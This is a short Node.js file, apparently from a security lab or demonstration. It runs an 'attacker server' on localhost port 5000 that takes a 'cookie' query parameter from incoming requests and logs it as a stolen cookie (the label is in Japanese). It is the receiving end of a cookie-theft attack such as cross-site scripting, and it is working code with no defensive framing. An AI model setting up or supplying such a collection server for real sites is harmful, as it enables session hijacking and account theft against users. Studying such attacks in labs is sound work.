const http = require("http");

http
  .createServer((req, res) => {
    const url = new URL(req.url, "http://localhost:5000");
    const cookie = url.searchParams.get("cookie");
    if (cookie) console.log("[窃取した Cookie]", cookie);
    res.end("ok");
  })
  .listen(5000, () => console.log("Attacker server on http://localhost:5000"));

